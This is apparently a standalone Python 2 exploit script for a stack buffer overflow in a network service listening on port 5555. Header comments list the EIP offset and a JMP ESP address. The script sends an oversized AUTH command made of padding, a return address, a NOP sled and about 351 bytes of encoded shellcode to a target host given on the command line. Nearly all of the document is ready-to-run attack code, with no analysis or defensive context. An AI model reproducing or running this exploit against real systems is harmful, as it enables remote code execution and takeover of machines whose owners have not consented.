#Information
#JMP ESP 65d11d71
#EIP 1040
#Shellcode 351
# ESP Space 418

#!/usr/bin/python
import time, struct, sys
import socket as so

shellcode = (
"\xdb\xdf\xd9\x74\x24\xf4\xbf\xc5\xb8\xa5\xf7\x5b\x29\xc9\xb1"
"\x52\x31\x7b\x17\x83\xeb\xfc\x03\xbe\xab\x47\x02\xbc\x24\x05"
"\xed\x3c\xb5\x6a\x67\xd9\x84\xaa\x13\xaa\xb7\x1a\x57\xfe\x3b"
"\xd0\x35\xea\xc8\x94\x91\x1d\x78\x12\xc4\x10\x79\x0f\x34\x33"
"\xf9\x52\x69\x93\xc0\x9c\x7c\xd2\x05\xc0\x8d\x86\xde\x8e\x20"
"\x36\x6a\xda\xf8\xbd\x20\xca\x78\x22\xf0\xed\xa9\xf5\x8a\xb7"
"\x69\xf4\x5f\xcc\x23\xee\xbc\xe9\xfa\x85\x77\x85\xfc\x4f\x46"
"\x66\x52\xae\x66\x95\xaa\xf7\x41\x46\xd9\x01\xb2\xfb\xda\xd6"
"\xc8\x27\x6e\xcc\x6b\xa3\xc8\x28\x8d\x60\x8e\xbb\x81\xcd\xc4"
"\xe3\x85\xd0\x09\x98\xb2\x59\xac\x4e\x33\x19\x8b\x4a\x1f\xf9"
"\xb2\xcb\xc5\xac\xcb\x0b\xa6\x11\x6e\x40\x4b\x45\x03\x0b\x04"
"\xaa\x2e\xb3\xd4\xa4\x39\xc0\xe6\x6b\x92\x4e\x4b\xe3\x3c\x89"
"\xac\xde\xf9\x05\x53\xe1\xf9\x0c\x90\xb5\xa9\x26\x31\xb6\x21"
"\xb6\xbe\x63\xe5\xe6\x10\xdc\x46\x56\xd1\x8c\x2e\xbc\xde\xf3"
"\x4f\xbf\x34\x9c\xfa\x3a\xdf\xa9\xf1\x44\x01\xc6\x07\x44\x3c"
"\xad\x81\xa2\x54\xc1\xc7\x7d\xc1\x78\x42\xf5\x70\x84\x58\x70"
"\xb2\x0e\x6f\x85\x7d\xe7\x1a\x95\xea\x07\x51\xc7\xbd\x18\x4f"
"\x6f\x21\x8a\x14\x6f\x2c\xb7\x82\x38\x79\x09\xdb\xac\x97\x30"
"\x75\xd2\x65\xa4\xbe\x56\xb2\x15\x40\x57\x37\x21\x66\x47\x81"
"\xaa\x22\x33\x5d\xfd\xfc\xed\x1b\x57\x4f\x47\xf2\x04\x19\x0f"
"\x83\x66\x9a\x49\x8c\xa2\x6c\xb5\x3d\x1b\x29\xca\xf2\xcb\xbd"
"\xb3\xee\x6b\x41\x6e\xab\x9c\x08\x32\x9a\x34\xd5\xa7\x9e\x58"
"\xe6\x12\xdc\x64\x65\x96\x9d\x92\x75\xd3\x98\xdf\x31\x08\xd1"
"\x70\xd4\x2e\x46\x70\xfd")

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x40" * 1040 + "\x71\x1d\xd1\x65" + "\x90" * 67 + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
